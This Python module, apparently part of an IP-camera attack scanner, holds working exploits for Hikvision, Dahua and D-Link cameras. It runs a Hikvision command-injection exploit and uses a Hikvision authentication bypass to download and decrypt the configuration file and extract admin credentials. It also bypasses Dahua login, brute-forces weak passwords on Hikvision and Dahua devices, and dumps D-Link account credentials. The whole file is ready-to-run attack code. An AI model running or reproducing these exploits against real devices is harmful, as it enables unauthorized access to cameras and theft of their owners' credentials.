"""Vulnerability Exploition"""
import os
import sys
import requests

CWD = os.path.dirname(__file__)
sys.path.append(os.path.join(CWD, '..'))
from utils.net import get_user_agent


timeout=2


def cve_2021_36260(ip: str) -> list:
    """海康威视任意命令执行漏洞"""
    cve_lib = os.path.join(CWD, 'lib/CVE-2021-36260.py')
    res = os.popen(f"python3 {cve_lib} --rhost {ip} --rport 80 --cmd 'pwd'").readlines()[-2].strip()
    return [res == '/home', 'Hikvision', 'cve-2021-36260']


def cve_2017_7921(ip: str) -> list:
    """海康威视绕过认证漏洞"""
    headers = {'User-Agent': get_user_agent()}
    user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"

    r = requests.get(user_url, timeout=timeout, verify=False, headers=headers)
    if r.status_code == 200 and 'userName' in r.text and 'priority' in r.text and 'userLevel' in r.text:
        rc = requests.get(config_url, timeout=timeout * 2, verify=False, headers=headers)
        with open(f"{ip}-config", 'wb') as f:
            f.write(rc.content)
        info = eval(os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readline().strip())
        idx = - info[::-1].index('admin')
        info = info[idx - 1: ]
        os.remove(f"{ip}-config")
        return [True, 'Hikvision', 'cve-2017-7921', str(info)]
    return [False, 'Hikvision', 'cve-2017-7921']


def hik_weak(ip, users=['admin'], passwords=['12345']) -> list:
    """海康威视弱口令扫描 & 也可使用密码字典进行爆破"""
    headers = {'User-Agent': get_user_agent()}
    for user in users:
        for p in passwords:
            r = requests.get(f"http://{ip}/PSIA/System/deviceinfo", auth=(user, p), timeout=timeout, verify=False, headers=headers)
            if 'IP CAMERA' in r.text or 'IPCamera' in r.text:
                return [True, 'Hikvision', 'weak pass', f"{user}:{p}"]
    return [False, 'Hikvision', 'weak pass']


def dahua_weak(ip, users=['admin'], passwords=['admin']) -> list:
    """大华摄像机弱口令扫描 & 也可使用密码字典进行爆破"""
    headers = {
        'User-Agent': get_user_agent(),
        'Host': ip,
        'Origin': 'http://' + ip,
        'Referer': 'http://' + ip,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest',
    }
    for user in users:
        for p in passwords:
            _json = {
                "method": "global.login",
                "params": {
                    "userName": user,
                    "password": p,
                    "clientType": "Web3.0",
                    "loginType": "Direct",
                    "authorityType": "Default",
                    "passwordType": "Plain",
                },
                "id": 1,
                "session": 0,
            }
            r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
            if r.status_code == 200 and r.json()['result']:
                return [True, 'Dahua', 'weak pass', f"{user}:{p}"]
    return [False, 'Dahua', 'weak pass']


def cve_2021_33044(ip: str) -> list:
    """大华摄像机绕过认证漏洞"""
    headers = {
        'User-Agent': get_user_agent(),
        'Host': ip,
        'Origin': 'http://' + ip,
        'Referer': 'http://' + ip,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest',
    }
    _json = {
        "method": "global.login",
        "params": {
            "userName": "admin",
            "password": "Not Used",
            "clientType": "NetKeyboard",
            "loginType": "Direct",
            "authorityType": "Default",
            "passwordType": "Default",
        },
        "id": 1,
        "session": 0,
    }
    r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
    if r.status_code == 200 and r.json()['result']:
        return [True, 'Dahua', 'cve-2021-33044']
    return [False, 'Dahua', 'cve-2021-33044']


def cve_2020_25078(ip: str) -> list:
    """DLink摄像头账号密码暴露漏洞"""
    headers = {'User-Agent': get_user_agent()}
    r = requests.get(f"http://{ip}/config/getuser?index=0", timeout=timeout, verify=False, headers=headers)
    if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
        return [True, 'DLink', 'cve-2020-25078', ','.join(r.text.split())]
    return [False, 'DLink', 'cve-2020-25078']


if __name__ == '__main__':
    # print(cve_2021_36260('10.101.35.74'))
    #  print(dahua_weak('172.17.211.3'))
    print(cve_2021_33044('172.17.211.3'))
